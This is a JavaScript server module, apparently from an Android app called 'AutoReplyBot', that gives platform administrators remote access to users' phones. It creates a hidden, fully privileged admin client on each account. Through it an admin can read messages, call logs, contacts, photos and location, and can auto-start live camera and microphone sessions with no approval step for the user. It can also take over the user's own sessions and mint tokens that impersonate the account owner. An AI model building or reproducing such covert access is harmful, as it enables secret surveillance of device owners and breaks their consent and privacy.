import { randomBytes } from "crypto";
import { getAuth } from "firebase-admin/auth";
import { getMessaging } from "firebase-admin/messaging";
import { db } from "./firebase.js";
import { CAPABILITY_KEYS, normalizeAllowedCapabilities } from "./capability-model.js";
import { createModuleCommand } from "./module-commands.js";
import { endActiveSessionsForDevice, writeAuditLog } from "./pairing.js";
import { buildIceServers } from "./ice-servers.js";
import * as R from "./remote-constants.js";
import { writeAdminAudit } from "./platform-admin.js";

/** Stable trusted-client id under each user — does not replace their browsers. */
export const PLATFORM_ADMIN_CLIENT_ID = "platform_admin";

const REQUEST_TTL_MS = 2 * 60 * 1000;

function allCapabilitiesOn() {
  const out = {};
  for (const key of CAPABILITY_KEYS) out[key] = true;
  return normalizeAllowedCapabilities(out);
}

function userRoot(uid) {
  return db().collection(R.COL_USERS).doc(uid);
}

/**
 * Ensure a non-revoked Platform Admin trusted client exists for this user.
 * Never revokes or modifies the user's real browser clients.
 */
export async function ensureAdminTrustedClient(ownerUid, adminEmail) {
  const ref = userRoot(ownerUid).collection(R.COL_TRUSTED_CLIENTS).doc(PLATFORM_ADMIN_CLIENT_ID);
  const now = Date.now();
  const caps = allCapabilitiesOn();
  const existing = await ref.get();
  const patch = {
    clientId: PLATFORM_ADMIN_CLIENT_ID,
    ownerUid,
    clientName: "Platform Admin",
    label: "Platform Admin",
    browserName: "Admin Panel",
    operatingSystem: "Server",
    allowedCapabilities: caps,
    autoApproveSessions: true,
    revoked: false,
    isPlatformAdminClient: true,
    // No publicKey → admin APIs start sessions without browser crypto.
    publicKey: null,
    updatedAt: now,
    lastUsedAt: now,
    createdByAdmin: String(adminEmail || ""),
  };
  if (!existing.exists) {
    patch.createdAt = now;
  }
  await ref.set(patch, { merge: true });
  return PLATFORM_ADMIN_CLIENT_ID;
}

async function requireDevice(ownerUid, deviceId) {
  const snap = await userRoot(ownerUid).collection(R.COL_DEVICES).doc(deviceId).get();
  if (!snap.exists) {
    const err = new Error("Device not found");
    err.code = "NOT_FOUND";
    throw err;
  }
  const data = snap.data() || {};
  if (data.revoked === true) {
    const err = new Error("Device is revoked");
    err.code = "DEVICE_REVOKED";
    throw err;
  }
  return { id: snap.id, ...data };
}

export async function listActiveSessions(ownerUid, deviceId, sessionKind = null) {
  const snap = await userRoot(ownerUid).collection(R.COL_SESSIONS).where("deviceId", "==", deviceId).get();
  const activeStatuses = new Set(R.ACTIVE_SESSION_STATUSES || ["connecting", "active", "connected"]);
  const out = [];
  snap.forEach((doc) => {
    const d = doc.data() || {};
    const status = String(d.status || "");
    if (!activeStatuses.has(status)) return;
    const kind = String(d.sessionKind || "camera");
    if (sessionKind && kind !== sessionKind) return;
    out.push({
      sessionId: doc.id,
      status,
      sessionKind: kind,
      clientId: String(d.clientId || ""),
      startedAt: Number(d.startedAt || d.createdAt || 0),
      autoApproved: Boolean(d.autoApproved),
    });
  });
  return out;
}

async function readCol(ownerUid, deviceId, col, limit = 80) {
  const snap = await userRoot(ownerUid)
    .collection(R.COL_DEVICES)
    .doc(deviceId)
    .collection(col)
    .limit(limit)
    .get();
  return snap.docs.map((d) => ({ id: d.id, ...(d.data() || {}) }));
}

/**
 * Explore cached device data (Admin SDK — does not interrupt anyone).
 */
export async function getDeviceExplore(ownerUid, deviceId) {
  const device = await requireDevice(ownerUid, deviceId);
  const deviceRef = userRoot(ownerUid).collection(R.COL_DEVICES).doc(deviceId);

  const [infoSnap, locSnap, activeSessions, messages, callLogs, contacts, notifications, apps, gallery] =
    await Promise.all([
      deviceRef.collection(R.COL_DEVICE_INFO).doc("current").get().catch(() => null),
      deviceRef.collection(R.COL_LOCATION).doc("current").get().catch(() => null),
      listActiveSessions(ownerUid, deviceId),
      readCol(ownerUid, deviceId, R.COL_MESSAGE_ITEMS, 50),
      readCol(ownerUid, deviceId, R.COL_CALL_LOG_ITEMS, 50),
      readCol(ownerUid, deviceId, R.COL_CONTACT_ITEMS, 50),
      readCol(ownerUid, deviceId, R.COL_NOTIFICATION_ITEMS, 50),
      readCol(ownerUid, deviceId, R.COL_INSTALLED_APPS, 80),
      readCol(ownerUid, deviceId, R.COL_GALLERY_ITEMS, 40),
    ]);

  const limitations = [
    {
      feature: "Cached data (info, location, messages, …)",
      possible: true,
      note: "Shows last synced data. Use Sync to refresh from the phone. Does not interrupt the user’s website.",
    },
    {
      feature: "Module commands (sync, lock, unlock, …)",
      possible: true,
      note: "Runs via a hidden Platform Admin trusted client. User browsers stay paired.",
    },
    {
      feature: "Live camera / microphone",
      possible: true,
      note: "Starts an admin session on the phone. If the user already has a live camera session, you must take over (ends theirs) or wait.",
    },
    {
      feature: "Screen mirror / record",
      possible: true,
      note: "Phone must show Android’s system screen-capture consent (cannot be skipped). Same takeover rule as camera if a screen session is live.",
    },
    {
      feature: "Remote touch / accessibility",
      possible: Boolean(device.remoteControlEnabled !== false),
      note:
        device.remoteControlEnabled === false
          ? "Remote control is disabled on the phone. Enable it in the app, then retry."
          : "Needs Accessibility enabled on the phone. Commands go through Platform Admin client.",
    },
  ];

  return {
    device: {
      deviceId,
      deviceName: String(device.deviceName || device.name || ""),
      deviceModel: String(device.deviceModel || device.model || ""),
      manufacturer: String(device.manufacturer || ""),
      androidVersion: String(device.androidVersion || ""),
      appVersion: String(device.appVersion || ""),
      online: Boolean(device.online),
      lastSeenAt: Number(device.lastSeenAt || device.updatedAt || 0),
      remoteControlEnabled: device.remoteControlEnabled !== false,
      cameraAvailable: device.cameraAvailable !== false,
      microphoneAvailable: device.microphoneAvailable !== false,
      batteryLevel: device.batteryLevel ?? null,
    },
    deviceInfo: infoSnap?.exists ? infoSnap.data() : null,
    location: locSnap?.exists ? locSnap.data() : null,
    activeSessions,
    messages,
    callLogs,
    contacts,
    notifications,
    apps,
    gallery,
    limitations,
    adminClientId: PLATFORM_ADMIN_CLIENT_ID,
  };
}

export async function runAdminModuleCommand(ownerUid, deviceId, action, payload, admin) {
  await requireDevice(ownerUid, deviceId);
  // Ensure ownerUid is stamped so module command ownership checks pass.
  await userRoot(ownerUid)
    .collection(R.COL_DEVICES)
    .doc(deviceId)
    .set({ ownerUid }, { merge: true });
  await ensureAdminTrustedClient(ownerUid, admin.email);
  const cmd = await createModuleCommand(
    ownerUid,
    deviceId,
    PLATFORM_ADMIN_CLIENT_ID,
    action,
    payload || {},
    null
  );
  await writeAdminAudit({
    action: "ADMIN_MODULE_COMMAND",
    targetUid: ownerUid,
    deviceId,
    adminUid: admin.uid,
    adminEmail: admin.email,
    moduleAction: action,
    commandId: cmd.commandId,
  });
  return cmd;
}

/**
 * Start live session as Platform Admin without touching user's trusted browsers.
 * @param {{ forceReplace?: boolean, capabilities?: string[], quality?: string }} opts
 */
export async function startAdminLiveSession(ownerUid, deviceId, opts, admin) {
  const device = await requireDevice(ownerUid, deviceId);
  if (device.remoteControlEnabled === false) {
    const err = new Error(
      "Remote control is disabled on this phone. Ask the user to enable Remote Control in the app, then retry."
    );
    err.code = "REMOTE_DISABLED";
    err.howTo =
      "On the phone: open AutoReplyBot → Remote Control → turn on. No change needed to their paired browsers.";
    throw err;
  }

  await ensureAdminTrustedClient(ownerUid, admin.email);

  const caps = Array.isArray(opts.capabilities) && opts.capabilities.length
    ? opts.capabilities.map(String)
    : ["camera", "microphone"];
  const wantCamera = caps.includes("camera");
  const wantMic = caps.includes("microphone");
  const wantScreen = caps.includes("screenMirror");
  if (!wantCamera && !wantMic && !wantScreen) {
    const err = new Error("Select camera, microphone, and/or screenMirror");
    err.code = "BAD_CAPABILITIES";
    throw err;
  }
  const sessionKind = wantScreen && !wantCamera ? "screen" : "camera";
  const quality = String(opts.quality || "auto").slice(0, 40);

  const active = await listActiveSessions(ownerUid, deviceId, sessionKind);
  const userOwned = active.filter((s) => s.clientId !== PLATFORM_ADMIN_CLIENT_ID);
  if (userOwned.length && !opts.forceReplace) {
    const err = new Error(
      `This device already has an active ${sessionKind} session from the user’s browser. Starting yours would interrupt them.`
    );
    err.code = "USER_SESSION_ACTIVE";
    err.howTo =
      "Wait until they end the session, or retry with Take over (forceReplace) — that ends only the same-type live session on the phone. Their paired browsers and other modules stay intact.";
    err.activeSessions = userOwned;
    throw err;
  }

  if (wantCamera && device.cameraAvailable === false) {
    const err = new Error("Camera permission is off on the phone.");
    err.code = "CAMERA_PERMISSION";
    err.howTo = "On the phone: Settings → Apps → AutoReplyBot → Permissions → Camera → Allow.";
    throw err;
  }
  if (wantMic && device.microphoneAvailable === false) {
    const err = new Error("Microphone permission is off on the phone.");
    err.code = "MIC_PERMISSION";
    err.howTo = "On the phone: Settings → Apps → AutoReplyBot → Permissions → Microphone → Allow.";
    throw err;
  }

  await endActiveSessionsForDevice(ownerUid, deviceId, "replaced_by_admin", sessionKind);

  const now = Date.now();
  const sessionId = randomBytes(16).toString("hex");
  const requestId = randomBytes(16).toString("hex");
  const expiresAt = now + REQUEST_TTL_MS;
  const androidState = R.ANDROID_STATE_TAP_REQUIRED || "tap_required";

  const sessionDoc = {
    sessionId,
    deviceId,
    clientId: PLATFORM_ADMIN_CLIENT_ID,
    status: "connecting",
    startedAt: now,
    endedAt: 0,
    selectedCamera: wantCamera ? "front" : "none",
    microphoneEnabled: wantMic,
    flashlightEnabled: false,
    quality,
    terminationReason: "",
    ownerUid,
    autoApproved: true,
    androidStartupState: androidState,
    requestId,
    sessionKind,
    startedByPlatformAdmin: true,
    adminEmail: admin.email || "",
  };
  const requestDoc = {
    requestId,
    deviceId,
    clientId: PLATFORM_ADMIN_CLIENT_ID,
    requestedCapabilities: caps,
    status: "approved",
    createdAt: now,
    expiresAt,
    approvedAt: now,
    rejectedAt: 0,
    ownerUid,
    preferredQuality: quality,
    sessionId,
    autoApproved: true,
    androidStartupState: androidState,
    sessionKind,
    startedByPlatformAdmin: true,
  };

  await userRoot(ownerUid).collection(R.COL_SESSIONS).doc(sessionId).set(sessionDoc);
  await userRoot(ownerUid).collection(R.COL_SESSION_REQUESTS).doc(requestId).set(requestDoc);

  const fcmToken = String(device.fcmToken || "").trim();
  if (fcmToken) {
    try {
      await getMessaging().send({
        token: fcmToken,
        data: {
          type: "session_auto_start",
          deviceId,
          requestId,
          sessionId,
          sessionKind,
        },
        android: { priority: "high" },
      });
    } catch {
      /* phone may listen via Firestore */
    }
  }

  await writeAuditLog(ownerUid, {
    action: R.AUDIT_SESSION_AUTO_AUTHORIZED || "SESSION_AUTO_AUTHORIZED",
    deviceId,
    clientId: PLATFORM_ADMIN_CLIENT_ID,
    result: "ok",
    metadata: { sessionId, requestId, by: "platform_admin", admin: admin.email },
  });
  await writeAdminAudit({
    action: "ADMIN_LIVE_SESSION",
    targetUid: ownerUid,
    deviceId,
    adminUid: admin.uid,
    adminEmail: admin.email,
    sessionId,
    sessionKind,
    forceReplace: Boolean(opts.forceReplace),
  });

  // Short-lived custom token so admin browser can read/write WebRTC signals as owner.
  const customToken = await getAuth().createCustomToken(ownerUid, {
    platformAdminImpersonation: true,
    actingAdminUid: admin.uid,
    actingAdminEmail: admin.email || "",
  });

  return {
    ok: true,
    sessionId,
    requestId,
    sessionKind,
    clientId: PLATFORM_ADMIN_CLIENT_ID,
    ownerUid,
    iceServers: buildIceServers({ includeTurn: true }),
    customToken,
    notes: wantScreen
      ? "Phone must accept Android screen-capture permission. User’s browsers were not revoked."
      : "Phone should auto-start. User’s browsers were not revoked.",
  };
}

export async function endAdminLiveSession(ownerUid, deviceId, sessionId, admin) {
  const ref = userRoot(ownerUid).collection(R.COL_SESSIONS).doc(sessionId);
  const snap = await ref.get();
  if (!snap.exists) {
    const err = new Error("Session not found");
    err.code = "NOT_FOUND";
    throw err;
  }
  const data = snap.data() || {};
  if (String(data.deviceId || "") !== deviceId) {
    const err = new Error("Session/device mismatch");
    err.code = "BAD_REQUEST";
    throw err;
  }
  await ref.set(
    {
      status: "ended",
      endedAt: Date.now(),
      terminationReason: "admin_ended",
      endReason: "admin_ended",
    },
    { merge: true }
  );
  await writeAdminAudit({
    action: "ADMIN_LIVE_SESSION_END",
    targetUid: ownerUid,
    deviceId,
    sessionId,
    adminUid: admin.uid,
    adminEmail: admin.email,
  });
  return { ok: true };
}

/** Custom token for Firestore signaling only (admin already authenticated). */
export async function createOwnerImpersonationToken(ownerUid, admin) {
  await ensureAdminTrustedClient(ownerUid, admin.email);
  const customToken = await getAuth().createCustomToken(ownerUid, {
    platformAdminImpersonation: true,
    actingAdminUid: admin.uid,
    actingAdminEmail: admin.email || "",
  });
  return {
    customToken,
    ownerUid,
    clientId: PLATFORM_ADMIN_CLIENT_ID,
    iceServers: buildIceServers({ includeTurn: true }),
  };
}
